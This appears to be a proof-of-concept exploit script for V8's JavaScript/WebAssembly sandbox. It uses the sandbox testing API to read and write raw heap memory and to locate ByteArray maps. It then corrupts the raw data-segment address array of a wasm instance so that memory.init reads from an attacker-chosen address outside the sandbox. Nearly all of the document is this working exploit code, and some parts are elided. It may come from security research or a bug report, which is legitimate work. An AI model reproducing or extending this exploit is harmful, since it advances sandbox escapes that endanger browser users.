// --- Inlined: test/mjsunit/wasm/wasm-module-builder.js ---
...
// --- End inlined wasm-module-builder.js ---

const kHeapObjectTag = 1;
const sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function read32(addr) { return sbx_memory.getUint32(addr, true); }
function read16(addr) { return sbx_memory.getUint16(addr, true); }
function read64(addr) {
  const lo = sbx_memory.getUint32(addr, true);
  const hi = sbx_memory.getUint32(addr + 4, true);
  return BigInt(lo) | (BigInt(hi) << 32n);
}
function write64(addr, val) {
  sbx_memory.setUint32(addr, Number(val & 0xFFFFFFFFn), true);
  sbx_memory.setUint32(addr + 4, Number((val >> 32n) & 0xFFFFFFFFn), true);
}

// ======================================================================
// Step 1: Find the ByteArray map in read-only space.
//
// All Maps have the meta-map as their first field. The meta-map is a
// self-referential map (its map pointer points to itself). We find it
// first, then scan for a Map with instance_type = BYTE_ARRAY_TYPE (218).
// ======================================================================

const BYTE_ARRAY_TYPE = 218;  // From torque-generated/instance-types.h

// Find the meta-map: a Map whose compressed map pointer equals its own
// tagged address (self-referential).
let meta_map_tagged = -1;
for (let off = 0; off < 0x10000; off += 4) {
  if (read32(off) === off + kHeapObjectTag) {
    meta_map_tagged = off + kHeapObjectTag;
    break;
  }
}

// Find the ByteArray map: a Map (meta_map at +0) with instance_type = 218 at +8.
let byte_array_map_tagged = -1;
for (let off = 0; off < 0x10000; off += 4) {
  if (read32(off) !== meta_map_tagged) continue;
  if (read16(off + 8) === BYTE_ARRAY_TYPE) {
    byte_array_map_tagged = off + kHeapObjectTag;
    break;
  }
}

// ======================================================================
// Step 2: Create a wasm module with a passive data segment.
// ======================================================================

const builder = new WasmModuleBuilder();
builder.addMemory(1, 1);

// Passive data segment. The wire bytes address of this segment's data is
// stored as a raw pointer in the in-sandbox FixedAddressArray.
builder.addPassiveDataSegment([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE]);

// Export memory.init wrapper.
builder.addFunction('init_seg', kSig_v_iii)
  .addBody([
    kExprLocalGet, 0,
    kExprLocalGet, 1,
    kExprLocalGet, 2,
    kNumericPrefix, kExprMemoryInit, 0, 0
  ]).exportFunc();
...
// GC to promote all objects to old space (known committed pages).
gc();
gc();

// Verify baseline.
instance.exports.init_seg(0, 0, 4);
const baseline = (instance.exports.load32(0) >>> 0).toString(16);
if (baseline !== 'efbeadde') {
  throw new Error('Baseline memory.init failed: got 0x' + baseline);
}

// ======================================================================
// Step 3: Find the data_segment_starts FixedAddressArray.
//
// The FixedAddressArray is a ByteArray with:
//   +0: compressed map pointer (ByteArray map)
//   +4: Smi length (byte_length << 1)
//   +8: raw 64-bit addresses (the wire bytes pointers)
//
// For 1 passive segment: byte_length = 8, so Smi(8) = 0x10.
//
// Strategy: find all heap pages with live objects, scan each page for
// ByteArrays matching our map and length, then trial-corrupt each to
// verify which one is data_segment_starts.
// ======================================================================

const inst_addr = Sandbox.getAddressOf(instance);
const kHeapPageSize = 0x40000;  // 256KB V8 heap page

// Find committed heap pages by probing many allocated objects.
let probes = [];
for (let i = 0; i < 500; i++) probes.push({i: i});
gc();

let page_set = new Set();
page_set.add(inst_addr & ~(kHeapPageSize - 1));
for (let p of probes) {
  page_set.add(Sandbox.getAddressOf(p) & ~(kHeapPageSize - 1));
}
let pages = Array.from(page_set).sort((a, b) => a - b);

// Scan all committed pages for ByteArrays with the exact map and length.
let byte_arrays = [];
for (let page_base of pages) {
  for (let off = page_base + 0x100; off < page_base + kHeapPageSize - 16; off += 4) {
    if (read32(off) !== byte_array_map_tagged) continue;
    let len_raw = read32(off + 4);
    if ((len_raw & 1) !== 0) continue;  // Not a Smi
    let byte_length = len_raw >> 1;
    if (byte_length < 8) continue;  // Too small to hold an Address
    byte_arrays.push({offset: off, byte_length: byte_length});
  }
}

// Trial corruption: corrupt each ByteArray's first 8 bytes of data with an
// unmapped address, then call memory.init. If it's the data_segment_starts
// array, memory.init will read from the corrupted address → SIGSEGV outside
// sandbox → sandbox violation.
for (let ba of byte_arrays) {
  let data_offset = ba.offset + 8;
  let orig = read64(data_offset);
  let corrupt_addr = 0x41414141000n;

  write64(data_offset, corrupt_addr);

  try {
    instance.exports.init_seg(200, 0, 1);
    // Still alive — not the right ByteArray. Restore and continue.
    write64(data_offset, orig);
  } catch(e) {
    // Trapped (e.g., out of bounds) — also not the right one. Restore.
    write64(data_offset, orig);
  }
  // If memory.init read from 0x41414141000, we crash here with:
  //   SIGSEGV at 0x41414141000 → sandbox violation (outside sandbox, above 4GB)
}